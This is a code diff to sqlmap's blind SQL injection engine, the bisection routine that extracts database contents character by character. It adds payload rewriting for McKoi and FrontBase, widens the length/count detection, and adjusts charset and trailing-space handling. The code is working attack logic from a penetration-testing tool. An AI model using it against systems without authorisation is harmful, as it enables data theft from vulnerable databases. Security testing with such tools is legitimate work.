@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
+Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)
 See the file 'LICENSE' for copying permission
 """
 
@@ -10,7 +10,6 @@ from __future__ import division
 import re
 import time
 
-from extra.safe2bin.safe2bin import safecharencode
 from lib.core.agent import agent
 from lib.core.common import Backend
 from lib.core.common import calculateDeltaSeconds
@@ -38,6 +37,7 @@ from lib.core.enums import CHARSET_TYPE
 from lib.core.enums import DBMS
 from lib.core.enums import PAYLOAD
 from lib.core.exception import SqlmapThreadException
+from lib.core.exception import SqlmapUnsupportedFeatureException
 from lib.core.settings import CHAR_INFERENCE_MARK
 from lib.core.settings import INFERENCE_BLANK_BREAK
 from lib.core.settings import INFERENCE_EQUALS_CHAR
@@ -58,6 +58,7 @@ from lib.core.threads import runThreads
 from lib.core.unescaper import unescaper
 from lib.request.connect import Connect as Request
 from lib.utils.progress import ProgressBar
+from lib.utils.safe2bin import safecharencode
 from lib.utils.xrange import xrange
 
 def bisection(payload, expression, length=None, charsetType=None, firstChar=None, lastChar=None, dump=False):
@@ -107,6 +108,24 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
 
             return 0, retVal
 
+    if Backend.isDbms(DBMS.MCKOI):
+        match = re.search(r"\ASELECT\b(.+)\bFROM\b(.+)\Z", expression, re.I)
+        if match:
+            original = queries[Backend.getIdentifiedDbms()].inference.query
+            right = original.split('<')[1]
+            payload = payload.replace(right, "(SELECT %s FROM %s)" % (right, match.group(2).strip()))
+            expression = match.group(1).strip()
+
+    elif Backend.isDbms(DBMS.FRONTBASE):
+        match = re.search(r"\ASELECT\b(\s+TOP\s*\([^)]+\)\s+)?(.+)\bFROM\b(.+)\Z", expression, re.I)
+        if match:
+            payload = payload.replace(INFERENCE_GREATER_CHAR, " FROM %s)%s" % (match.group(3).strip(), INFERENCE_GREATER_CHAR))
+            payload = payload.replace("SUBSTRING", "(SELECT%sSUBSTRING" % (match.group(1) if match.group(1) else " "), 1)
+            expression = match.group(2).strip()
+
+
+#<inference query="(SELECT SUBSTRING((%s) FROM %d FOR 1) FROM %s)>'%c'"/>
+
     try:
         # Set kb.partRun in case "common prediction" feature (a.k.a. "good samaritan") is used or the engine is called from the API
         if conf.predictOutput:
@@ -118,9 +137,9 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
 
         if partialValue:
             firstChar = len(partialValue)
-        elif re.search(r"(?i)\b(LENGTH|LEN)\(", expression):
+        elif re.search(r"(?i)(\b|CHAR_)(LENGTH|LEN|COUNT)\(", expression):
             firstChar = 0
-        elif (kb.fileReadMode or dump) and conf.firstChar is not None and (isinstance(conf.firstChar, int) or (hasattr(conf.firstChar, "isdigit") and conf.firstChar.isdigit())):
+        elif conf.firstChar is not None and (isinstance(conf.firstChar, int) or (hasattr(conf.firstChar, "isdigit") and conf.firstChar.isdigit())):
             firstChar = int(conf.firstChar) - 1
             if kb.fileReadMode:
                 firstChar <<= 1
@@ -129,9 +148,9 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
         else:
             firstChar = 0
 
-        if re.search(r"(?i)\b(LENGTH|LEN)\(", expression):
+        if re.search(r"(?i)(\b|CHAR_)(LENGTH|LEN|COUNT)\(", expression):
             lastChar = 0
-        elif dump and conf.lastChar is not None and (isinstance(conf.lastChar, int) or (hasattr(conf.lastChar, "isdigit") and conf.lastChar.isdigit())):
+        elif conf.lastChar is not None and (isinstance(conf.lastChar, int) or (hasattr(conf.lastChar, "isdigit") and conf.lastChar.isdigit())):
             lastChar = int(conf.lastChar)
         elif hasattr(lastChar, "isdigit") and lastChar.isdigit() or isinstance(lastChar, int):
             lastChar = int(lastChar)
@@ -194,7 +213,7 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
                 hintValue = kb.hintValue
 
             if payload is not None and len(hintValue or "") > 0 and len(hintValue) >= idx:
-                if Backend.getIdentifiedDbms() in (DBMS.SQLITE, DBMS.ACCESS, DBMS.MAXDB, DBMS.DB2):
+                if "'%s'" % CHAR_INFERENCE_MARK in payload:
                     posValue = hintValue[idx - 1]
                 else:
                     posValue = ord(hintValue[idx - 1])
@@ -425,6 +444,10 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
                             else:
                                 return None
             else:
+                if "'%s'" % CHAR_INFERENCE_MARK in payload and conf.charset:
+                    errMsg = "option '--charset' is not supported on '%s'" % Backend.getIdentifiedDbms()
+                    raise SqlmapUnsupportedFeatureException(errMsg)
+
                 candidates = list(originalTbl)
                 bit = 0
                 while len(candidates) > 1:
@@ -636,8 +659,8 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
                 elif (conf.verbose in (1, 2) and not kb.bruteMode) or conf.api:
                     dataToStdout(filterControlChars(val))
 
-                # some DBMSes (e.g. Firebird, DB2, etc.) have issues with trailing spaces
-                if Backend.getIdentifiedDbms() in (DBMS.FIREBIRD, DBMS.DB2, DBMS.MAXDB) and len(partialValue) > INFERENCE_BLANK_BREAK and partialValue[-INFERENCE_BLANK_BREAK:].isspace():
+                # Note: some DBMSes (e.g. Firebird, DB2, etc.) have issues with trailing spaces
+                if Backend.getIdentifiedDbms() in (DBMS.FIREBIRD, DBMS.DB2, DBMS.MAXDB, DBMS.DERBY, DBMS.FRONTBASE) and len(partialValue) > INFERENCE_BLANK_BREAK and partialValue[-INFERENCE_BLANK_BREAK:].isspace():
                     finalValue = partialValue[:-INFERENCE_BLANK_BREAK]
                     break
                 elif charsetType and partialValue[-1:].isspace():
